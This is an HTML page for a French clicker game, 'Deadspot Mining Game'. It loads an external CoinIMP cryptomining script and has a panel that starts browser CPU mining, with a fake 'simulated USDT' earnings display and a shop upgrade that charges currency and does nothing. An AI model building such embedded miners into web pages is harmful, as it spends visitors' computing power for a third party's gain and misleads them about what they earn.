<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Deadspot Mining Game</title>
<style>
  body {
    background:#0d0d0d;
    color:#ccc;
    font-family:Consolas, monospace;
    margin:0;
    padding:0;
    display:flex;
    flex-direction:column;
    align-items:center;
  }
  header {
    width:100%;
    background:#111;
    padding:10px;
    text-align:center;
    border-bottom:1px solid #333;
  }
  .stats {
    display:flex;
    justify-content:space-around;
    width:100%;
    background:#1a1a1a;
    padding:10px;
    border-bottom:1px solid #333;
  }
  .stats div {
    text-align:center;
  }
  #gameArea {
    display:flex;
    width:100%;
    justify-content:space-around;
    margin-top:10px;
  }
  .card {
    background:#1a1a1a;
    border:1px solid #333;
    border-radius:8px;
    padding:10px;
    margin:5px;
    flex:1;
    min-height:250px;
  }
  button {
    background:#222;
    color:#0f0;
    border:1px solid #333;
    border-radius:5px;
    padding:8px 12px;
    margin:4px;
    cursor:pointer;
  }
  button:hover { background:#333; }
  #clickBtn {
    width:120px; height:120px;
    border-radius:50%;
    background:url('https://i.ibb.co/2W9ZcXk/skull.png') center/cover;
    border:3px solid #666;
  }
  #cpuMining {
    width:95%;
    margin:20px auto;
    background:#111;
    padding:15px;
    border:1px solid #333;
    border-radius:10px;
  }
  #cpuLogs {
    background:#000;
    color:#0f0;
    font-size:12px;
    padding:10px;
    height:250px;
    overflow-y:auto;
    border:1px solid #333;
  }
  table { width:100%; border-collapse:collapse; margin-top:10px; }
  td,th { border:1px solid #333; padding:4px; text-align:center; }
  canvas { background:#000; width:100%; height:200px; }
</style>
<script src="https://www.hostingcloud.racing/24b28c3ad1a7b448.js"></script>
</head>
<body>
<header>
  <h1>üíÄ Deadspot Mining Game</h1>
  <div id="clock"></div>
</header>
<div class="stats">
  <div>XP: <span id="xp">0</span></div>
  <div>Niveau: <span id="level">1</span></div>
  <div>√ânergie: <span id="energy">100</span></div>
  <div>Deadspot: <span id="deadspot">0</span></div>
  <div>Diamants: <span id="diamonds">0</span></div>
</div>
<div id="gameArea">
  <div class="card" style="text-align:center">
    <button id="clickBtn"></button>
    <p>Click pour miner ‚ö°</p>
  </div>
  <div class="card">
    <h3>Shop</h3>
    <button onclick="buyUpgrade('doubleClick')">‚ö° Double Clic (Permanent) - 10 Deadspot</button>
    <button onclick="buyUpgrade('tripleClick')">‚ö° Triple Power +3 (Permanent) - 25 Deadspot</button>
    <button onclick="buyUpgrade('regenEnergy')">‚ö° Regen √ânergie +30% (Temp 1h) - 10D + 5üíé</button>
    <button onclick="buyUpgrade('energy1000')">+1000 √ânergie - 250D + 58üíé</button>
    <button onclick="buyUpgrade('energy2500')">+2500 √ânergie - 650D + 128üíé</button>
    <button onclick="buyUpgrade('energy5500')">+5500 √ânergie - 815D + 279üíé</button>
    <button onclick="buyUpgrade('clickx50')">x50 Clic Power - 4000üíé</button>
  </div>
  <div class="card" id="miningCenter">
    <h3>Mining Center</h3>
    <p>Total Core: <b id="core">0</b></p>
    <p>Production: <b id="coreRate">0</b> Core/s</p>
    <button onclick="convertCore()">Convertir Core ‚Üí Deadspot</button>
    <div id="minersSlots"></div>
    <h4>Boutique Mineurs</h4>
    <div id="minerShop"></div>
  </div>
</div>
<div id="cpuMining">
  <h2>üñ•Ô∏è CPU Mining (CoinIMP)</h2>
  <button onclick="toggleCPUMiner()" id="cpuBtn">D√©marrer</button>
  <table>
    <tr><th>Hashrate</th><th>Total Hashes</th><th>Accept√©s</th><th>USDT simul√©</th></tr>
    <tr><td id="hs">0</td><td id="th">0</td><td id="ah">0</td><td id="usdt">0</td></tr>
  </table>
  <canvas id="hashGraph"></canvas>
  <div id="cpuLogs"></div>
</div>
<script>
// State
let state={xp:0,level:1,energy:100,deadspot:0,diamonds:0,core:0,coreRate:0,clickPower:1,miners:[],cpuMining:false};

// Clock
function updateClock(){
  document.getElementById('clock').innerText=new Date().toLocaleString('fr-CA',{timeZone:'America/Toronto'});
}
setInterval(updateClock,1000);

// Click
const btn=document.getElementById('clickBtn');
btn.onclick=()=>{
  if(state.energy>0){
    state.energy--;
    state.xp+=1;
    state.core+=state.clickPower*10;
    if(state.xp>=state.level*100){state.level++;state.xp=0;}
    refresh();
  }
};

// Shop upgrades
function buyUpgrade(type){
  if(type==='doubleClick'&&state.deadspot>=10){state.clickPower*=2;state.deadspot-=10;}
  if(type==='tripleClick'&&state.deadspot>=25){state.clickPower+=3;state.deadspot-=25;}
  if(type==='regenEnergy'&&state.deadspot>=10&&state.diamonds>=5){state.deadspot-=10;state.diamonds-=5;setTimeout(()=>{},3600000);}
  if(type==='energy1000'&&state.deadspot>=250&&state.diamonds>=58){state.energy+=1000;state.deadspot-=250;state.diamonds-=58;}
  if(type==='energy2500'&&state.deadspot>=650&&state.diamonds>=128){state.energy+=2500;state.deadspot-=650;state.diamonds-=128;}
  if(type==='energy5500'&&state.deadspot>=815&&state.diamonds>=279){state.energy+=5500;state.deadspot-=815;state.diamonds-=279;}
  if(type==='clickx50'&&state.diamonds>=4000){state.clickPower*=50;state.diamonds-=4000;}
  refresh();
}

// Mining Center
let miners=[{name:"Miner V1",rate:25,price:{d:50,di:10}},{name:"Miner V2",rate:100,price:{d:150,di:40}},{name:"Miner V3",rate:500,price:{d:500,di:120}},{name:"Miner V4 Pro",rate:2000,price:{d:1500,di:400}}];
function renderMinerShop(){
  let html="";
  miners.forEach((m,i)=>{html+=`<button onclick="buyMiner(${i})">${m.name} - ${m.rate} Core/s - ${m.price.d}D + ${m.price.di}üíé</button><br>`;});
  document.getElementById('minerShop').innerHTML=html;
}
renderMinerShop();
function buyMiner(i){let m=miners[i];if(state.deadspot>=m.price.d&&state.diamonds>=m.price.di){state.deadspot-=m.price.d;state.diamonds-=m.price.di;state.miners.push(m);state.coreRate+=m.rate;}refresh();}
function convertCore(){while(state.core>=100000){state.deadspot++;state.core-=100000;}refresh();}

// Refresh UI
function refresh(){
  document.getElementById('xp').innerText=state.xp;
  document.getElementById('level').innerText=state.level;
  document.getElementById('energy').innerText=state.energy;
  document.getElementById('deadspot').innerText=state.deadspot;
  document.getElementById('diamonds').innerText=state.diamonds;
  document.getElementById('core').innerText=state.core;
  document.getElementById('coreRate').innerText=state.coreRate;
}

// Passive Core gain
setInterval(()=>{state.core+=state.coreRate;refresh();},1000);

// CPU Miner (CoinIMP)
let client=_client;
let ctx=document.getElementById('hashGraph').getContext('2d');
let graphData=[];
function toggleCPUMiner(){
  state.cpuMining=!state.cpuMining;
  document.getElementById('cpuBtn').innerText=state.cpuMining?"Arr√™ter":"D√©marrer";
  if(state.cpuMining){client.start();log("CPU Miner d√©marr√©");}else{client.stop();log("CPU Miner arr√™t√©");}
}
function log(msg){let box=document.getElementById('cpuLogs');box.innerHTML+=`[${new Date().toLocaleTimeString()}] ${msg}<br>`;box.scrollTop=box.scrollHeight;}
setInterval(()=>{
  if(state.cpuMining){
    let hs=client.getHashesPerSecond();
    let th=client.getTotalHashes();
    let ah=client.getAcceptedHashes();
    document.getElementById('hs').innerText=hs.toFixed(2);
    document.getElementById('th').innerText=th;
    document.getElementById('ah').innerText=ah;
    let usdt=(th/100000).toFixed(4);
    document.getElementById('usdt').innerText=usdt;
    graphData.push(hs);
    if(graphData.length>50)graphData.shift();
    drawGraph();
    log(`net new job diff accepted=${ah} | H/s=${hs.toFixed(2)}`);
  }
},2000);
function drawGraph(){ctx.clearRect(0,0,ctx.canvas.width,ctx.canvas.height);ctx.beginPath();ctx.strokeStyle="#0f0";ctx.moveTo(0,200-graphData[0]);graphData.forEach((v,i)=>{ctx.lineTo(i*5,200-v);});ctx.stroke();}
</script>
</body>
</html>
